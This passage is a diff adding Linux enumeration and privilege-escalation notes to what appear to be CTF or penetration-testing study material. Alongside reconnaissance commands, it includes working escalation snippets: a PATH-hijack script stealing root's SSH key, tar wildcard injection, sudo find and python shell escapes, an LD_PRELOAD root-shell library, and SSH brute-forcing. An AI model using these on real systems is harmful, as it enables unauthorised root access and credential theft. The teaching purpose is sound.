@@ -322,6 +322,16133 @@
 
 ---
 
+# Linux/Unix-Specific Enumeration
+
+## SSH Enumeration
+
+SSH enumeration identifies running SSH services, determines protocol versions, gathers key exchange information, and fingerprints the SSH implementation for version-specific vulnerability research.
+
+**Service Discovery and Port Identification**
+
+Use `nmap` with service version detection to identify SSH services across the network:
+
+```bash
+nmap -sV -p 22 <target>
+nmap -sV -p- <target>
+nmap -sV -p 22,2222,22000-22100 <target>
+```
+
+The `-sV` flag performs version detection by connecting to identified open ports and analyzing banner responses. SSH typically runs on port 22, but enumerate alternative ports when standard reconnaissance indicates non-standard configurations.
+
+For UDP-based scanning or when TCP SYN scans are restricted:
+
+```bash
+nmap -sU -p 22 <target>
+```
+
+**Banner Grabbing and Protocol Analysis**
+
+Direct banner grabbing reveals SSH server implementation and version information:
+
+```bash
+nc -v <target> 22
+cat </dev/null | nc <target> 22
+timeout 2 bash -c 'cat </dev/null > /dev/tcp/<target>/22' && cat </dev/tcp/<target>/22
+```
+
+OpenSSH typically responds with a banner like `SSH-2.0-OpenSSH_7.4` or `SSH-1.99-OpenSSH_3.9p1`. The format provides:
+
+- Protocol version (SSH-2.0 or SSH-1.99 indicating SSH1 support)
+- Implementation name (OpenSSH, libssh, Dropbear, etc.)
+- Implementation version
+- Optional platform information
+
+**Advanced SSH Fingerprinting**
+
+The `ssh-keyscan` utility performs non-interactive SSH host key retrieval:
+
+```bash
+ssh-keyscan -t rsa,dsa,ecdsa,ed25519 <target>
+ssh-keyscan -p 2222 <target>
+ssh-keyscan -T 10 <target>
+```
+
+Parameters: `-t` specifies key types, `-p` specifies port (default 22), `-T` sets connection timeout in seconds. Output shows host keys in a format suitable for `known_hosts` files. Analyze key types and sizes for infrastructure insights—presence of older DSA keys suggests legacy systems.
+
+**Vulnerability Assessment**
+
+Query SSH implementation versions against known vulnerability databases:
+
+```bash
+searchsploit OpenSSH 7.4
+```
+
+Cross-reference identified versions with CVE databases. [Unverified] Some CTF environments include deliberately outdated SSH versions with known vulnerabilities like username enumeration or timing attacks, though specific vulnerability presence depends on server configuration and patches applied.
+
+**Credential Enumeration Techniques**
+
+SSH permits username enumeration through authentication timing differences:
+
+```bash
+ssh -v invalid_user@<target> 2>&1 | grep -i "no such user"
+```
+
+[Inference] Authentication timing varies between valid and invalid usernames due to different code paths in authentication handlers, though this behavior depends on specific SSH implementation details not guaranteed across all versions.
+
+Automated enumeration tools:
+
+```bash
+hydra -L userlist.txt -p password <target> ssh
+medusa -h <target> -u username -P passlist.txt -M ssh
+```
+
+**Key Exchange and Algorithm Analysis**
+
+Examine supported algorithms using `sshpass` combined with verbose output:
+
+```bash
+ssh -v <target> 2>&1 | grep -E "kex|encrypt|mac|host"
+```
+
+Review supported key exchange algorithms, encryption ciphers, and message authentication codes. Weak algorithms (DES, RC4, MD5-based MACs) indicate potential cryptographic weaknesses [Unverified] depending on SSH library implementation and compilation flags.
+
+---
+
+## NFS Share Discovery
+
+NFS (Network File System) enumeration identifies exported shares, maps mount points, and determines access permissions for potential privilege escalation or data extraction.
+
+**NFS Service Identification**
+
+Identify NFS services running on standard and non-standard ports:
+
+```bash
+nmap -sV -p 111,2049,20048 <target>
+nmap -sV -p 111,2049 --script nfs* <target>
+rpcinfo -p <target>
+```
+
+NFS relies on RPC (Remote Procedure Call) services. Port 111 typically runs `portmapper` (rpcbind), port 2049 runs the NFS daemon. The `rpcinfo` command queries the RPC portmapper to enumerate all registered services:
+
+```bash
+rpcinfo -p <target> | grep nfs
+```
+
+Output displays NFS version numbers (typically 2, 3, or 4), protocols (tcp/udp), and port assignments.
+
+**Export List Enumeration**
+
+Query the NFS server for exported shares:
+
+```bash
+showmount -e <target>
+showmount -e --all <target>
+nmap -p 111 --script=nfs-showmount <target>
+```
+
+The `showmount` command (available on Linux systems with NFS utilities installed) queries the `mountd` service to display exported filesystems. Output format:
+
+```
+Export list for <target>:
+/exported/path  <IP-range-or-client>
+/home           *
+/var/backups    192.168.1.0/24
+```
+
+Wildcards (*) indicate world-readable exports; specific IP ranges restrict access. `/etc/exports` on NFS servers defines these policies [Inference] but enumeration tools reveal only what the server advertises regardless of actual access restrictions.
+
+**Mount Point Access Testing**
+
+Attempt mounting discovered NFS exports:
+
+```bash
+mount -t nfs <target>:/exported/path /mnt/nfs
+mount -t nfs -o nolock <target>:/home /mnt/nfs_home
+mount -t nfsv4 <target>:/ /mnt/nfsv4
+```
+
+Use `nolock` option when the NFS server lacks proper locking daemon support. NFSv3 mounts may succeed even without explicit access grants [Inference] due to authentication model differences compared to NFSv4.
+
+**Permissions and Access Control Analysis**
+
+After mounting, examine file permissions and ownership:
+
+```bash
+ls -la /mnt/nfs
+stat /mnt/nfs/file.txt
+getfacl /mnt/nfs/directory
+```
+
+NFS UID/GID mapping determines effective permissions. Root access on NFS clients does not guarantee root access to mounted shares [Inference] when `root_squash` is configured on the server, mapping root to `nobody` user (typically UID 65534).
+
+Test privilege behavior:
+
+```bash
+touch /mnt/nfs/test_file.txt
+cat /mnt/nfs/etc_shadow_copy
+```
+
+If files owned by root are writable by non-root users, root_squash is not configured [Inference]. This condition enables privilege escalation through NFS when combined with setuid binaries or configuration files editable by unprivileged users.
+
+**Advanced Enumeration with Nmap**
+
+Comprehensive NFS reconnaissance:
+
+```bash
+nmap -p 111 --script=rpc-grind <target>
+nmap -p 111 --script=nfs* --script-args nfs.version=3 <target>
+```
+
+The `rpc-grind` script enumerates RPC services; NFS-specific scripts perform version detection, export listing, and permission analysis.
+
+**Credential and UID Mapping**
+
+NFS v3 and earlier use UID-based authentication [Unverified] without strong cryptographic verification. Potential UID/GID manipulation:
+
+```bash
+useradd -u 0 -o -s /bin/bash root_copy
+```
+
+[Inference] Adding local users with UIDs matching remote NFS server users may grant access to those users' files when mounted with NFS v3 and no_root_squash configuration, though actual behavior depends on mount options and server-side access controls.
+
+---
+
+## Linux Service Enumeration
+
+Service enumeration identifies running services, determines versions, maps listening ports, and correlates services with potential vulnerabilities.
+
+**Network Service Discovery**
+
+Comprehensive port scanning identifies running services:
+
+```bash
+nmap -sV <target>
+nmap -sV -p- <target>
+nmap -sV -A <target>
+```
+
+The `-A` flag combines OS detection, version detection, script scanning, and traceroute. For large networks:
+
+```bash
+nmap -sV --top-ports 1000 <target-range>
+```
+
+**Process-Level Service Enumeration (Local)**
+
+When gaining shell access to target systems, enumerate running services:
+
+```bash
+ps aux
+ps aux | grep -i service_name
+netstat -tlnp
+netstat -tulpn | grep LISTEN
+ss -tlnp
+ss -tulpn | grep LISTEN
+```
+
+The `ss` command (socket statistics) provides superior performance on modern systems. Output format displays protocol (tcp/udp), local address:port, state, and associated PID/program name.
+
+**Service Version Fingerprinting**
+
+Connect directly to services for banner information:
+
+```bash
+telnet <target> <port>
+nc -v <target> <port>
+curl -v <target>:<port>
+```
+
+Many services respond with version banners during initial connection. HTTP services typically reveal server headers:
+
+```bash
+curl -I http://<target>
+```
+
+Database services often respond with version strings upon connection (MySQL, PostgreSQL, MongoDB defaults).
+
+**Systemd Service Analysis (Modern Linux)**
+
+Systems using systemd expose service configuration:
+
+```bash
+systemctl list-unit-files --type=service
+systemctl list-units --type=service --all
+systemctl status service_name
+systemctl show service_name
+journalctl -u service_name -n 50
+```
+
+The `show` command displays service properties including ExecStart paths, User/Group ownership, and environment variables. Examine service files directly:
+
+```bash
+cat /etc/systemd/system/service_name.service
+cat /usr/lib/systemd/system/service_name.service
+```
+
+**Init.d Service Analysis (Legacy Systems)**
+
+Older systems use SysVinit:
+
+```bash
+ls -la /etc/init.d/
+cat /etc/init.d/service_name
+chkconfig --list
+service --status-all
+```
+
+Service startup scripts in `/etc/init.d/` often contain hardcoded paths, credentials, or version information.
+
+**Listening Port Analysis**
+
+Map listening ports to services:
+
+```bash
+lsof -i -P -n | grep LISTEN
+netstat -tulnp
+ss -tulnp
+netstat -tulnp | awk '{print $4, $7}' | sort -u
+```
+
+Unexpected services on high-numbered ports may indicate backdoors or non-standard deployments. Compare listening ports against standard service defaults to identify anomalies.
+
+**Weak Service Configurations**
+
+Identify services running under unprivileged users but performing privileged operations [Inference] such as database services running as root, web servers handling file operations with elevated privileges, or security services running as standard users without capability sets.
+
+**Service Dependency Analysis**
+
+Understand service relationships and startup order:
+
+```bash
+systemctl list-dependencies service_name
+systemctl list-dependencies --reverse service_name
+cat /etc/systemd/system/multi-user.target.wants/
+```
+
+Services with mutual dependencies or circular relationships may create race conditions or exploitation vectors [Unverified] depending on specific system configurations.
+
+---
+
+## User Account Enumeration
+
+User enumeration identifies system users, determines privilege levels, discovers interactive accounts, and maps user-to-service relationships for privilege escalation planning.
+
+**Local User Discovery**
+
+Extract user information from authentication databases:
+
+```bash
+cat /etc/passwd
+cat /etc/shadow (requires root)
+getent passwd
+getent shadow (requires root)
+```
+
+The `/etc/passwd` file lists users accessible to unprivileged users; `/etc/shadow` contains password hashes and requires elevated privileges. Fields in `/etc/passwd`:
+
+```
+username:password_placeholder:UID:GID:GECOS:home_directory:login_shell
+```
+
+Identify interactive users (login_shell != /nologin or /false), system users (UID < 1000 typically on Linux), and service accounts.
+
+**UID/GID Analysis**
+
+Users with UID 0 possess root privileges. Unexpected root-equivalent UIDs indicate privilege escalation opportunities:
+
+```bash
+awk -F: '$3 == 0 {print $1}' /etc/passwd
+```
+
+Examine GID mappings for group-based privileges:
+
+```bash
+cat /etc/group
+getent group
+groups username
+id username
+```
+
+Groups with GID 0 (root group) or capabilities-granting groups (docker, sudoers, wheel) enable privilege escalation.
+
+**Home Directory and Shell Analysis**
+
+Interactive users possess writable home directories and command interpreters:
+
+```bash
+ls -la /home/
+ls -la /root/
+grep -v /nologin /etc/passwd | grep -v /false
+```
+
+Home directories contain configuration files, credentials, SSH keys, and application data. Examine shell types to understand user capabilities—service accounts use `/bin/false` or `/usr/sbin/nologin` [Inference] preventing interactive login though [Unverified] specific shells and their restrictions depend on configuration.
+
+**SSH Key Enumeration**
+
+Discover SSH keypairs for lateral movement:
+
+```bash
+find /home -name "*.pub" 2>/dev/null
+find /home -name "id_rsa" 2>/dev/null
+find /home -name "authorized_keys" 2>/dev/null
+find /root -name ".ssh" -type d 2>/dev/null
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/config
+```
+
+Analyze SSH configuration for host aliases, port forwarding, identity file specifications, and proxy jump configurations.
+
+**Sudo Privilege Analysis**
+
+Determine privilege escalation paths via sudo:
+
+```bash
+sudo -l
+sudo -l -U targetuser
+cat /etc/sudoers (usually requires root)
+ls -la /etc/sudoers.d/
+cat /etc/sudoers.d/*
+```
+
+Output format shows commands users can execute with elevated privileges:
+
+```
+(ALL) ALL           — execute any command as any user
+(root) NOPASSWD     — execute as root without password prompt
+(ALL) /bin/cat      — execute only /bin/cat as any user
+```
+
+Note NOPASSWD entries and command wildcards enabling privilege escalation. Analyze wrapped commands for [Inference] potential bypass techniques through argument manipulation or environment variable abuse, though actual bypass feasibility depends on specific sudo version and command implementation.
+
+**Password Policy and Account Aging**
+
+Examine authentication constraints:
+
+```bash
+cat /etc/login.defs
+cat /etc/shadow | cut -d: -f1,3,4,5,6,7,8,9
+chage -l username
+```
+
+The `/etc/shadow` file fields (after username and hash):
+
+```
+last_changed:min_days:max_days:warn_days:inactive_days:expire_date:reserved
+```
+
+Inactive accounts or those with expired passwords represent potential dormant access points.
+
+**Service Account Identification**
+
+Map services to user accounts:
+
+```bash
+ps aux | awk '{print $1}' | sort -u
+systemctl list-units --type=service --all | grep -oE 'User=\w+' | cut -d= -f2 | sort -u
+grep -E '^[a-z_][a-z0-9_-]*\$' /etc/passwd
+```
+
+Service accounts running security-critical applications (web servers, databases, monitoring tools) represent privilege escalation targets when vulnerable services run under these accounts.
+
+**Historical User Activity**
+
+Identify recently active or suspicious accounts:
+
+```bash
+lastlog
+last
+lastb
+w
+who
+```
+
+The `lastlog` command displays last login information per user. Compare against current system time to identify dormant accounts. `lastb` shows failed login attempts (typically requires root access to `/var/log/btmp`).
+
+**Privilege Escalation Path Mapping**
+
+Correlate users with exploitable configurations [Inference] such as users in group memberships enabling docker access, users with scheduled tasks under cron, or users with capabilities assigned via `setcap`. Concrete exploitation depends on specific system configuration, installed packages, and running services.
+
+## Cron Job Discovery
+
+Cron jobs represent persistent execution mechanisms often exploitable through insecure task scheduling, world-writable scripts, or path manipulation vulnerabilities.
+
+**System-Wide Cron Configuration**
+
+The primary cron configuration directory is `/etc/cron.d/`, containing system-level scheduled tasks that execute with specific user privileges defined in the sixth field.
+
+```bash
+ls -la /etc/cron.d/
+cat /etc/cron.d/*
+```
+
+Examine `/etc/crontab` for the default system scheduler configuration:
+
+```bash
+cat /etc/crontab
+```
+
+**Time-Based Cron Directories**
+
+Cron provides pre-configured execution directories for hourly, daily, weekly, and monthly tasks:
+
+```bash
+ls -la /etc/cron.hourly/
+ls -la /etc/cron.daily/
+ls -la /etc/cron.weekly/
+ls -la /etc/cron.monthly/
+```
+
+These directories often contain world-readable scripts executed with elevated privileges. Check permissions and ownership:
+
+```bash
+find /etc/cron.* -type f -exec ls -la {} \;
+find /etc/cron.* -type f -perm -002 -exec ls -la {} \;
+```
+
+The `-002` permission flag identifies world-writable files, indicating potential privilege escalation vectors.
+
+**User-Specific Cron Jobs**
+
+Each user maintains individual cron configurations in `/var/spool/cron/crontabs/` (Linux) or `/var/cron/tabs/` (some BSD systems). Read access requires root or ownership:
+
+```bash
+ls -la /var/spool/cron/crontabs/
+cat /var/spool/cron/crontabs/$USER
+```
+
+Enumerate all user cron jobs by iterating through readable entries:
+
+```bash
+for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done
+```
+
+**Cron Log Analysis**
+
+Examine historical cron execution through system logs, typically stored in `/var/log/cron` (RHEL/CentOS) or `/var/log/syslog` (Debian/Ubuntu):
+
+```bash
+grep CRON /var/log/syslog
+grep "cron\[" /var/log/syslog | tail -100
+journalctl -u cron --since "1 hour ago"
+```
+
+**Exploitation Methodology**
+
+Identify exploitable cron jobs through these characteristics:
+
+- **World-writable script targets**: Scripts executed by root but writable by unprivileged users
+    
+    ```bash
+    find / -type f -writable -executable 2>/dev/null | while read file; do grep -l "$(basename $file)" /etc/cron.* 2>/dev/null && echo "$file"; done
+    ```
+    
+- **Relative path execution**: Cron jobs using relative paths instead of absolute paths, enabling PATH manipulation
+    
+    ```bash
+    grep -h "^[^#]" /etc/crontab | grep -v "^[[:space:]]*$" | grep -E "^\s*[^/]"
+    ```
+    
+- **Unquoted variable expansion**: Cron commands with unquoted variables vulnerable to command injection
+    
+    ```bash
+    grep -h "^[^#]" /etc/cron.d/* | grep '\$'
+    ```
+    
+
+**PATH Hijacking Example**: If a cron job executes `backup.sh` without full path, create a malicious `backup.sh` in a directory earlier in the cron's PATH:
+
+```bash
+echo '#!/bin/bash' > /tmp/backup.sh
+echo 'cat /root/.ssh/id_rsa > /tmp/root_key' >> /tmp/backup.sh
+chmod +x /tmp/backup.sh
+export PATH=/tmp:$PATH
+```
+
+**Wildcard Expansion Vulnerability**: Cron jobs using wildcards (e.g., `tar czf archive.tar.gz *`) are vulnerable to argument injection through specially-crafted filenames:
+
+```bash
+cd /target/directory
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=id'
+```
+
+## SUDO Privilege Enumeration
+
+SUDO misconfigurations represent the most common privilege escalation vector in CTF scenarios and production systems.
+
+**Sudoers Configuration Review**
+
+The primary configuration file `/etc/sudoers` defines privilege delegation. Parse it with validated tools to prevent syntax errors:
+
+```bash
+sudoedit /etc/sudoers
+sudo -l
+sudo -l -U root
+```
+
+The `-l` flag lists all SUDO commands executable by the current user:
+
+```bash
+sudo -l
+# Output example:
+# User victim may run the following commands on target:
+#     (root) NOPASSWD: /usr/bin/find
+#     (www-data) /usr/bin/python3
+```
+
+**Sudoers Directory Analysis**
+
+Additional sudoers configurations in `/etc/sudoers.d/` supplement the main file:
+
+```bash
+ls -la /etc/sudoers.d/
+cat /etc/sudoers.d/*
+```
+
+**Capability-Based Privilege Analysis**
+
+Extract privilege information from sudoers output systematically:
+
+```bash
+sudo -l 2>/dev/null | grep -E "^\s*\(" | sed 's/.*(\([^)]*\)).*/\1/'
+```
+
+**NOPASSWD Exploitation**
+
+Commands executable without password authentication represent immediate escalation paths:
+
+```bash
+sudo -l | grep NOPASSWD
+# If NOPASSWD is present, execute directly:
+sudo /path/to/command
+```
+
+**Wildcard Exploitation in Sudoers**
+
+Sudoers entries using wildcards can be exploited through path manipulation:
+
+```bash
+sudo -l | grep '*'
+# Example: (root) /usr/bin/script.sh *
+# Exploit: sudo /usr/bin/script.sh /root/.ssh/id_rsa
+```
+
+**Command Parameter Exploitation**
+
+Commands with user-controlled parameters enable command injection:
+
+```bash
+# If sudoers allows: (root) /usr/bin/find
+# Exploit find's command execution:
+sudo find / -exec cat /root/flag.txt \;
+sudo find / -exec /bin/bash \;
+
+# If sudoers allows: (root) /usr/bin/python3
+# Exploit Python for shell access:
+sudo python3 -c "import os; os.system('/bin/bash')"
+```
+
+**Environment Variable Exploitation**
+
+[Inference] SUDO can be configured to preserve environment variables through `env_keep` or `env_reset` settings. Test inherited variables:
+
+```bash
+sudo -l 2>/dev/null | grep -i env
+env -i sudo -l  # Test with clean environment
+```
+
+If `LD_LIBRARY_PATH` or `LD_PRELOAD` are preserved, create malicious shared objects:
+
+```bash
+cat > /tmp/exploit.c << 'EOF'
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void init() {
+    setuid(0);
+    system("/bin/bash");
+}
+EOF
+
+gcc -shared -fPIC -o /tmp/exploit.so /tmp/exploit.c
+sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/vulnerable_cmd
+```
+
+**Sudo Version Exploitation**
+
+Identify SUDO version and cross-reference known CVEs:
+
+```bash
+sudo --version
+# Output: Sudo version 1.8.21p2
+```
+
+[Unverified] CVE databases should be consulted for version-specific vulnerabilities, as behavior varies significantly across SUDO versions prior to 1.9.x.
+
+**Privilege Escalation from Restricted User Context**
+
+If a specific user can execute privileged commands:
+
+```bash
+sudo -u www-data /usr/bin/python3 -c "import os; os.system('/bin/bash')"
+# Now execute privileged commands as www-data
+```
+
+## Kernel Version Detection
+
+Kernel vulnerabilities often provide direct privilege escalation paths, particularly in older or unpatched systems.
+
+**Kernel Version Extraction**
+
+```bash
+uname -a
+uname -r
+cat /proc/version
+cat /etc/os-release
+hostnamectl
+```
+
+**Detailed Kernel Information**
+
+```bash
+cat /proc/cmdline
+dmesg | head -20
+```
+
+**Architecture and Capability Detection**
+
+```bash
+uname -m
+getconf LONG_BIT
+ldd /bin/ls | grep libc
+file /bin/ls
+```
+
+Identifies 32-bit vs. 64-bit systems and ASLR/DEP capabilities.
+
+**Kernel Module Analysis**
+
+```bash
+lsmod
+cat /proc/modules
+modinfo module_name
+```
+
+Custom or vulnerable kernel modules represent exploitation vectors.
+
+**CVE Correlation and Exploitation**
+
+Document the exact kernel version:
+
+```bash
+uname -r
+# Example output: 4.4.0-21-generic
+```
+
+Cross-reference against known vulnerability databases:
+
+- **Dirty COW** (CVE-2016-5195): Affects kernels < 4.8.3
+- **Dirty Pipe** (CVE-2022-0847): Affects kernels 5.8-5.15
+- **PwnKit** (CVE-2021-4034): Affects pkexec across multiple versions
+
+[Unverified] Specific exploitation feasibility depends on additional system factors including SELinux/AppArmor status, available compilers, and runtime restrictions.
+
+Automated enumeration scripts like `linux-exploit-suggester.sh` correlate kernel versions to exploits:
+
+```bash
+./linux-exploit-suggester.sh
+```
+
+[Inference] Such tools generate candidates rather than confirmed exploitable vulnerabilities; manual verification of each CVE's applicability is required.
+
+## Package Manager Analysis
+
+Package managers reveal installed software versions, missing security patches, and dependency chains for privilege escalation.
+
+**Distribution Identification**
+
+```bash
+cat /etc/os-release
+lsb_release -a
+cat /etc/issue
+cat /etc/*-release
+```
+
+Determines appropriate package manager (apt, yum, pacman, etc.).
+
+**Package Manager Detection**
+
+```bash
+which apt apt-get yum dnf pacman zypper
+dpkg --version
+rpm --version
+```
+
+**Installed Package Enumeration**
+
+Debian/Ubuntu-based systems:
+
+```bash
+dpkg -l
+apt list --installed
+apt-cache search .
+```
+
+Red Hat/CentOS-based systems:
+
+```bash
+rpm -qa
+yum list installed
+dnf list installed
+```
+
+Arch-based systems:
+
+```bash
+pacman -Q
+pacman -Ss
+```
+
+**Package Version Extraction**
+
+```bash
+dpkg -l | grep package_name
+rpm -q package_name
+apt-cache policy package_name
+```
+
+**Dependency Chain Analysis**
+
+Identify package dependencies that might contain vulnerabilities:
+
+```bash
+apt-cache depends package_name
+apt-cache rdepends package_name
+rpm -qR package_name
+```
+
+**Security Update Status**
+
+```bash
+apt update && apt list --upgradable
+yum check-update
+dnf check-update
+sudo unattended-upgrade -d
+```
+
+Lists available security patches and identifies unpatched systems.
+
+**Vulnerable Package Identification**
+
+Query for known vulnerable versions:
+
+```bash
+apt-cache policy openssh-server
+dpkg -l | grep -E "sudo|openssh|apache|nginx|mysql"
+```
+
+Compare against CVE databases for exploitation vectors.
+
+**Package File Ownership Analysis**
+
+Identify misconfigured package installations with exploitable permissions:
+
+```bash
+dpkg -L package_name | xargs ls -la
+rpm -ql package_name | xargs ls -la 2>/dev/null
+```
+
+Look for world-writable or world-readable sensitive files.
+
+**Custom/Manually Installed Software**
+
+Locate software not managed by package managers:
+
+```bash
+find /opt -type f -executable 2>/dev/null
+find /usr/local -type f -executable 2>/dev/null
+ls -la /root/
+find /home -name "*.sh" -o -name "*.py" 2>/dev/null
+```
+
+These often contain unpatched or beta versions with known vulnerabilities.
+
+**Package Source Configuration**
+
+```bash
+cat /etc/apt/sources.list
+ls -la /etc/apt/sources.list.d/
+cat /etc/yum.repos.d/*
+```
+
+Identifies third-party repositories that may contain backdoored or vulnerable packages.
+
+---
+
+## Process Enumeration
+
+### Core Process Discovery
+
+**Basic Process Listing**
+
+```bash
+ps aux
+ps -ef
+ps auxf  # Tree view with process hierarchy
+```
+
+**Detailed Process Information**
+
+```bash
+ps -eo pid,ppid,cmd,user,group,%cpu,%mem,stat,start
+ps -p <PID> -o pid,ppid,user,args,wchan
+```
+
+**Process Tree Visualization**
+
+```bash
+pstree -p  # Show PIDs
+pstree -a  # Show command line arguments
+pstree -u  # Show user transitions
+```
+
+**Real-time Process Monitoring**
+
+```bash
+top
+htop  # Enhanced interactive viewer
+atop  # Advanced system resource monitor
+```
+
+**Process File Descriptors**
+
+```bash
+lsof -p <PID>  # Files opened by specific process
+lsof -u <username>  # Files opened by user
+lsof -i  # Network connections
+lsof +D /path  # All processes using directory
+```
+
+**Process Command Lines and Environment**
+
+```bash
+cat /proc/<PID>/cmdline | tr '\0' ' '
+cat /proc/<PID>/environ | tr '\0' '\n'
+strings /proc/<PID>/environ
+```
+
+**Process Memory Maps**
+
+```bash
+cat /proc/<PID>/maps
+pmap <PID>
+pmap -x <PID>  # Extended information
+```
+
+**Process Limits and Status**
+
+```bash
+cat /proc/<PID>/limits
+cat /proc/<PID>/status
+cat /proc/<PID>/stat
+```
+
+**Socket and Network Process Relationships**
+
+```bash
+ss -tulpn  # Shows process information with sockets
+netstat -tulpn | grep <PID>
+fuser -v <port>/tcp
+```
+
+**Process Capabilities**
+
+```bash
+getpcaps <PID>
+cat /proc/<PID>/status | grep Cap
+capsh --decode=<capability_hex>
+```
+
+**Identifying Interesting Processes**
+
+```bash
+# Processes running as root
+ps aux | grep ^root
+
+# Processes with open network connections
+lsof -i -n -P
+
+# Processes running from unusual locations
+ps aux | grep -E '(/tmp|/dev/shm|/var/tmp)'
+
+# Processes with SUID/SGID bits
+ps -eo pid,user,group,args | grep -v "^root"
+```
+
+**Scheduled Tasks via Process Analysis**
+
+```bash
+ps aux | grep cron
+cat /proc/$(pgrep cron)/cmdline
+```
+
+## Network Configuration Analysis
+
+### Interface Enumeration
+
+**Network Interfaces**
+
+```bash
+ip addr show
+ip link show
+ifconfig -a
+cat /proc/net/dev
+ls /sys/class/net/
+```
+
+**Interface Statistics**
+
+```bash
+ip -s link
+netstat -i
+cat /proc/net/netstat
+cat /proc/net/snmp
+```
+
+### Routing and Network Paths
+
+**Routing Tables**
+
+```bash
+ip route show
+route -n
+netstat -rn
+cat /proc/net/route
+```
+
+**IP Forwarding Status**
+
+```bash
+cat /proc/sys/net/ipv4/ip_forward
+sysctl net.ipv4.ip_forward
+```
+
+**IPv6 Configuration**
+
+```bash
+ip -6 addr show
+ip -6 route show
+cat /proc/sys/net/ipv6/conf/all/forwarding
+```
+
+### Active Connections and Listening Ports
+
+**Socket Statistics**
+
+```bash
+ss -tunapl  # All TCP/UDP sockets with process info
+ss -tulpn  # Listening ports
+ss -tanp  # TCP connections
+ss -o state established  # Established connections with timers
+```
+
+**Legacy netstat Commands**
+
+```bash
+netstat -tunapl
+netstat -tulpn
+netstat -anp | grep ESTABLISHED
+```
+
+**Connection State Analysis**
+
+```bash
+ss -tan | awk '{print $1}' | sort | uniq -c  # Count by state
+ss dst :443  # Connections to specific port
+ss sport = :ssh  # Connections from specific port
+```
+
+### ARP and Neighbor Discovery
+
+**ARP Cache**
+
+```bash
+ip neigh show
+arp -an
+cat /proc/net/arp
+```
+
+**ARP Cache for Specific Interface**
+
+```bash
+ip neigh show dev eth0
+```
+
+### DNS Configuration
+
+**DNS Resolvers**
+
+```bash
+cat /etc/resolv.conf
+cat /etc/hosts
+systemd-resolve --status  # systemd-resolved systems
+resolvectl status
+```
+
+**DNS Cache (if present)**
+
+```bash
+systemd-resolve --statistics
+nscd -g  # Name Service Cache Daemon
+```
+
+### Network Service Detection
+
+**Identifying Network Services**
+
+```bash
+ss -tulpn | column -t
+lsof -i -P -n
+fuser -v -n tcp <port>
+```
+
+**Xinetd/Inetd Services**
+
+```bash
+cat /etc/inetd.conf
+ls /etc/xinetd.d/
+cat /etc/xinetd.d/*
+```
+
+**Systemd Socket Units**
+
+```bash
+systemctl list-sockets
+systemctl list-units --type=socket
+```
+
+### Network Configuration Files
+
+**Primary Configuration Locations**
+
+```bash
+cat /etc/network/interfaces  # Debian/Ubuntu
+cat /etc/sysconfig/network-scripts/ifcfg-*  # RHEL/CentOS
+cat /etc/netplan/*.yaml  # Ubuntu 18.04+
+nmcli connection show  # NetworkManager
+```
+
+**Hostname Configuration**
+
+```bash
+hostname
+hostnamectl
+cat /etc/hostname
+cat /etc/hosts
+```
+
+### Network Kernel Parameters
+
+**TCP/IP Stack Parameters**
+
+```bash
+sysctl -a | grep net
+cat /proc/sys/net/ipv4/tcp_*
+cat /proc/sys/net/core/*
+```
+
+**Specific Security-Relevant Parameters**
+
+```bash
+cat /proc/sys/net/ipv4/conf/all/accept_source_route
+cat /proc/sys/net/ipv4/conf/all/accept_redirects
+cat /proc/sys/net/ipv4/icmp_echo_ignore_all
+cat /proc/sys/net/ipv4/tcp_syncookies
+```
+
+## Firewall Rule Discovery
+
+### iptables Analysis
+
+**Listing All Rules**
+
+```bash
+iptables -L -n -v  # All chains, numeric, verbose
+iptables -S  # Rules in save format
+iptables -L -n -v --line-numbers  # With line numbers
+```
+
+**Chain-Specific Analysis**
+
+```bash
+iptables -L INPUT -n -v
+iptables -L OUTPUT -n -v
+iptables -L FORWARD -n -v
+```
+
+**NAT Rules**
+
+```bash
+iptables -t nat -L -n -v
+iptables -t nat -L PREROUTING -n -v
+iptables -t nat -L POSTROUTING -n -v
+```
+
+**Mangle and Raw Tables**
+
+```bash
+iptables -t mangle -L -n -v
+iptables -t raw -L -n -v
+```
+
+**IPv6 Firewall**
+
+```bash
+ip6tables -L -n -v
+ip6tables -S
+```
+
+**Rule Persistence Detection**
+
+```bash
+cat /etc/iptables/rules.v4
+cat /etc/iptables/rules.v6
+cat /etc/sysconfig/iptables  # RHEL/CentOS
+iptables-save
+ip6tables-save
+```
+
+### nftables Analysis
+
+**Listing nftables Rules**
+
+```bash
+nft list ruleset
+nft list tables
+nft list table inet filter
+nft list chain inet filter input
+```
+
+**Exporting Configuration**
+
+```bash
+nft -a list ruleset  # With handles
+nft -j list ruleset  # JSON format
+```
+
+**Configuration Files**
+
+```bash
+cat /etc/nftables.conf
+ls /etc/nftables/
+```
+
+### UFW (Uncomplicated Firewall)
+
+**UFW Status and Rules**
+
+```bash
+ufw status verbose
+ufw status numbered
+ufw show raw
+```
+
+**UFW Configuration Files**
+
+```bash
+cat /etc/ufw/ufw.conf
+cat /etc/ufw/before.rules
+cat /etc/ufw/after.rules
+cat /etc/ufw/user.rules
+cat /etc/default/ufw
+ls /etc/ufw/applications.d/
+```
+
+### firewalld Analysis
+
+**Current Configuration**
+
+```bash
+firewall-cmd --list-all
+firewall-cmd --list-all-zones
+firewall-cmd --get-active-zones
+firewall-cmd --list-services
+firewall-cmd --list-ports
+```
+
+**Zone-Specific Details**
+
+```bash
+firewall-cmd --zone=public --list-all
+firewall-cmd --info-zone=public
+```
+
+**Direct Rules**
+
+```bash
+firewall-cmd --direct --get-all-rules
+firewall-cmd --direct --get-all-chains
+```
+
+**Rich Rules**
+
+```bash
+firewall-cmd --list-rich-rules
+firewall-cmd --zone=public --list-rich-rules
+```
+
+**Configuration Files**
+
+```bash
+ls /etc/firewalld/zones/
+cat /etc/firewalld/firewalld.conf
+ls /usr/lib/firewalld/services/
+```
+
+### Connection Tracking
+
+**Conntrack Analysis**
+
+```bash
+conntrack -L  # List connections
+conntrack -L -o extended
+cat /proc/net/nf_conntrack
+conntrack -S  # Statistics
+```
+
+### Low-Level Firewall Detection
+
+**Kernel Modules**
+
+```bash
+lsmod | grep -E 'ip_tables|nf_|iptable|ip6'
+lsmod | grep -E 'nf_tables|nft'
+```
+
+**Loaded Netfilter Hooks**
+
+```bash
+cat /proc/net/netfilter/nfnetlink_queue
+ls /proc/sys/net/netfilter/
